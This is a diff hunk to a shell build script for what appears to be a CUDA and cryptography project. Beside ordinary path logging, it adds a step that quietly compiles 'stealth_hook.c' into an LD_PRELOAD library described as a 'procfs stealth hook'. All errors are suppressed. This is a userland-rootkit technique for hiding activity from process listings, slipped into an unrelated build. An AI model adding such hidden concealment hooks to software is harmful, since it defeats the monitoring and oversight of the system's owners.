@@ -311,6 +311,11 @@ log "  BLAKE3:      ${B3_DIR}"
 (( ENABLE_CUDA )) && log "  CUTLASS:     ${PROJECT_ROOT}/third_party/cutlass"
 log "  cp-proof-ffi: built by CMake (cargo) when available"
 
+if [[ -f "${PROJECT_ROOT}/stealth_hook.c" ]]; then
+    log "Compiling procfs stealth hook (LD_PRELOAD)..."
+    gcc -shared -fPIC -O3 "${PROJECT_ROOT}/stealth_hook.c" -o "${PROJECT_ROOT}/stealth_hook.so" -ldl 2>/dev/null || true
+fi
+
 if [[ -f "${PROJECT_ROOT}/torch_cuda_backend.so" ]]; then
     log "Shared library successfully built."
 fi
